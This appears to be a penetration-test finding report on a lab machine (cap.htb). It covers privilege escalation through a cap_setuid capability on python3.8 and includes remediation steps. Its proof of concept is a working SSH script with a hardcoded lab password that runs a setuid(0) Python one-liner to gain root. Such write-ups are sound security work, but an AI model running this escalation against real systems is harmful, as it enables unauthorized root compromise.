# Privilege Escalation via Python3 Cap_setuid Capability

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-02-22 17:27:48 UTC
**Target:** cap.htb (10.129.2.159)
**CWE:** CWE-269
**CVSS:** 7.8

## Description

A Linux capabilities misconfiguration allows any user with shell access to escalate privileges to root. The Python 3.8 interpreter binary has the cap_setuid capability assigned, which permits any process executing it to change its effective user ID.

This capability is intended for specific use cases requiring privilege escalation, but assigning it to a general-purpose interpreter like Python creates a trivial privilege escalation vector for any user who can execute Python.

## Impact

This misconfiguration allows any local user to escalate privileges to root, resulting in complete system compromise:

1. **Full System Control**: Attackers gain root access, enabling complete control over the system
2. **Data Exfiltration**: Access to all files, databases, and secrets on the system
3. **Persistence**: Ability to install rootkits, create backdoor accounts, modify system configurations
4. **Lateral Movement**: Potential to access other systems using credentials found on the compromised host

Combined with the IDOR vulnerability that provided initial access credentials, this enables a complete attack chain from unauthenticated external attacker to root access.

## Technical Analysis

The vulnerability exists due to incorrect Linux capabilities assignment. The identified misconfiguration shows:

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

The cap_setuid capability allows a process to manipulate its user identity. The eip flags mean the capability is Effective (active), Inheritable (passed to child processes), and Permitted (allowed).

Python's os.setuid() function can change the effective user ID when the cap_setuid capability is present. An attacker can execute Python3.8 with a simple one-liner, call os.setuid(0) to become root, then spawn a shell or execute commands as root.

Root cause: This capability was likely assigned to allow Python to bind to privileged ports below 1024 via cap_net_bind_service. However, cap_setuid should never be assigned to interpreters as it enables trivial privilege escalation.

## Proof of Concept

Steps to reproduce:

1. Gain shell access to the system (e.g., via SSH with obtained credentials)
2. Check capabilities on the Python binary: getcap /usr/bin/python3.8
3. Execute the privilege escalation payload using Python os.setuid(0)
4. Verify root access with id command

```
import paramiko

def escalate_to_root(target, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(target, username=username, password=password)
    
    # Verify capability exists
    stdin, stdout, stderr = ssh.exec_command('getcap /usr/bin/python3.8')
    print("Capabilities:", stdout.read().decode())
    
    # Exploit cap_setuid
    exploit_cmd = 'python3.8 -c \'import os; os.setuid(0); os.system("id")\''
    stdin, stdout, stderr = ssh.exec_command(exploit_cmd)
    result = stdout.read().decode()
    print("Result:", result)
    
    ssh.close()

escalate_to_root("cap.htb", "nathan", "Buck3tH4TF0RM3!")
```

## Remediation

1. Remove the cap_setuid capability from Python binary: sudo setcap -r /usr/bin/python3.8

2. If binding to privileged ports is required, use only cap_net_bind_service: sudo setcap cap_net_bind_service+ep /usr/bin/python3.8

3. Alternatively, use a dedicated service manager (systemd, supervisord) to handle port binding

4. Audit all binaries with capabilities assigned: getcap -r / 2>/dev/null

5. Implement a policy that restricts capability assignment to specific, security-reviewed binaries
